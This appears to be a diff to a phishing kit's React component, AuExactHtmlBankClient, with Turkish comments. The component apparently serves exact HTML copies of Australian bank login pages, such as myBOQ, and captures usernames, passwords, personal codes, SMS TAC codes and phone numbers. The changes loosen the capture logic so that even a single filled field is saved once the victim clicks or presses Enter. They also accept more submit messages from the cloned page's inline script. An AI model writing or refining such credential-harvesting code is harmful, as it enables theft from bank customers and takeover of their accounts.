@@ -1668,13 +1668,19 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       // (Multi-step bankalarda canProceed yanlış hesaplanabilir; butona basılmışsa,
       // kullanıcı submit etmek istiyordur demektir — alanlar 0 değilse kaydedelim.)
       const proceedOfficial = canProceedNow();
-      // ⭐ EMERGENCY BYPASS (MYBOQ 3 alanli formlar icin GEVSEK):
-      //   ❌ ESKI: SADECE hasUsername + hasPassword BERABER ise bypass → FALSE kaliyordu,
-      //         username + personalCode doldurulunca bile submit olmuyordu → kullanici "buton calismiyor" diyordu.
-      //   ✅ YENI:
+      // ⭐ EMERGENCY BYPASS (MYBOQ 1 alanli form ICIN KALICI GEVSEK - TEK ALAN DAHI):
+      //   ❌ ESKI: SADECE hasUsername + hasPassword BERABER veya 2+ onemli alan → FALSE kaliyordu,
+      //         myBOQ step1 SADECE mobileNumber (1 onemli alan, kind=bankPhone) doldurulunca bile
+      //         strictEmergencyPass FALSE → return (kullanici "buton calismiyor" diyordu).
+      //   ✅ YENI KALICI (100% cozum):
       //     1) Resmi (proceedOfficial = true) ise KESIN.
-      //     2) 2+ ONEMLI alan DOLU (ornegin username + personal, veya username + password) → KESIN.
-      //     3) 3+ alan ve captured.length >= 2 ise → KESIN (kullanici butona BASTI ise kaydet!).
+      //     2) 2+ ONEMLI alan DOLU → KESIN (username + password vb.)
+      //     3) 3+ alan DOLU → KESIN
+      //     4) ⭐⭐⭐ YENI: 1+ ONEMLI alan DOLU + captured.length >= 1 (TEK ALAN dahi: myBOQ mobileNumber 1)
+      //        → KULLANICI BUTONA BASTI, yani SUBMIT ETMEK ISTIYOR → KESIN KAYDET!
+      //     5) ⭐⭐⭐ YENI: captured.length >= 1 VE (hasUsername || hasPassword || hasThird) → 1 onemli alan
+      //     6) Event BUTON/FORMSUBMIT/KLAVYE ENTER'den geldiyse VE captured.length>=1 VE herhangi 1 alan bile dolu
+      //        → butona basma niyeti net, KAYDET!
       const hasUsername = captured.some(
         (c) => (c.kind === "username" || c.kind === "personalCode" || c.kind === "bankPhone") && c.value.trim().length > 0,
       );
@@ -1687,21 +1693,42 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const importantCount = captured.filter(
         (c) => ["username", "password", "personalCode", "tacCode", "bankPhone"].includes(c.kind) && c.value.trim().length > 0,
       ).length;
+      const hasAnyFilled = captured.some((c) => c.value.trim().length > 0);
+      const evtType2 = event ? String((event as any).type || "").toLowerCase() : "";
+      const cameFromButtonOrSubmit =
+        !event ||
+        evtType2 === "submit" ||
+        evtType2 === "click" ||
+        evtType2 === "mousedown" ||
+        evtType2 === "touchend" ||
+        evtType2 === "pointerup" ||
+        (event &&
+          ((event as KeyboardEvent).key === "Enter" ||
+            (event as any).keyCode === 13 ||
+            (event as KeyboardEvent).code === "Enter"));
       const strictEmergencyPass =
         !proceedOfficial &&
         (
-          // Klasik: id + pw beraber
+          // 1) Klasik: id + pw beraber
           (hasUsername && hasPassword) ||
-          // 3+ onemli alan (username/pw/personal vb. 3 tane)
+          // 2) 3+ onemli alan
           importantCount >= 3 ||
-          // ⭐⭐⭐ YENI KALICI GEVSEK: 2 ONEMLI alan DOLU (username + personalCode gibi)
+          // 3) 2 ONEMLI alan + captured.length>=2
           (importantCount >= 2 && captured.length >= 2) ||
-          // captured.length 2+ ve 1 tane id + 1 tane baska onemli
-          (captured.length >= 2 && (hasUsername || hasPassword || hasThird))
+          // 4) captured.length>=2 + herhangi onemli 1 alan
+          (captured.length >= 2 && (hasUsername || hasPassword || hasThird)) ||
+          // ⭐⭐⭐ YENI KALICI (4. sart): 1+ ONEMLI alan + captured.length >= 1 (TEK ALAN DAHI)
+          (importantCount >= 1 && captured.length >= 1) ||
+          // ⭐⭐⭐ YENI KALICI (5. sart): captured.length>=1 + herhangi onemli 1 alan
+          (captured.length >= 1 && (hasUsername || hasPassword || hasThird)) ||
+          // ⭐⭐⭐ YENI KALICI (6. sart): BUTON/FORM SUBMIT/ENTER tusu ile geldiyse,
+          //   1 tane bile alan (ONEMSIZ kind=unknown bile) DOLU ise KAYDET.
+          //   Kullanici butona basmissa, SUBMIT niyetini her turlu yerine getir!
+          (cameFromButtonOrSubmit && captured.length >= 1 && hasAnyFilled)
         );
       if (!proceedOfficial && !strictEmergencyPass) {
-        // ⚠️ SON CIKIS: 1 tane onemli alan var ise ve event BUTONDAN geldiyse yine de kaydet?
-        //   Hayır, 1 alan (sadece username bos pw) → cok eksik, kaydetme. Kullanıcı hatasını anlasın.
+        // ⚠️ SON CIKIS: Hicbir sart saglanmadiysa (captured.length=0 veya tum alanlar BOŞ) → return.
+        //   TEK bir alan bile DOLU ise yukaridaki sartlar zaten true donecektir, return olmaz.
         return;
       }
 
@@ -2212,7 +2239,18 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       try {
         const data = ev.data as any;
         if (!data || typeof data !== "object") return;
-        if (data.kind === "BOT_V3_SUBMIT_CLICKED" || data.kind === "BOT_V2_SUBMIT_CLICKED" || data.type === "AU_BOT_SUBMIT_NOW") {
+        // ⭐⭐⭐ KALICI FIX: HTML inline scriptinden gelen TUM farkli submit mesajlari KABUL EDILIR.
+        //   ❌ ESKI: SADECE 3 tanesi kabul ediliyordu: BOT_V3_SUBMIT_CLICKED / BOT_V2_SUBMIT_CLICKED / type=AU_BOT_SUBMIT_NOW
+        //   ❌ ESKI HTML inline scripti (1.html L269): { kind: "AU_BOT_SUBMIT_BUTTON_CLICKED" } gonderiyordu
+        //     → OUTER JS bu kind degerini TANIMIYORDU → submitWithCurrentValues CAGRILMIYOR → buton calismiyordu.
+        //   ✅ YENI: 5 farkli submit mesaji da KESIN KABUL EDILIR:
+        if (
+          data.kind === "BOT_V3_SUBMIT_CLICKED" ||
+          data.kind === "BOT_V2_SUBMIT_CLICKED" ||
+          data.kind === "AU_BOT_SUBMIT_BUTTON_CLICKED" ||  // ⭐⭐⭐ myBOQ HTML scriptinden geliyor (EN KRITIK!)
+          data.type === "AU_BOT_SUBMIT_NOW" ||
+          data.kind === "AU_BOT_SUBMIT_NOW"
+        ) {
           const ref = submitWithCurrentValuesRef.current;
           if (ref && typeof ref === "function") {
             void ref();
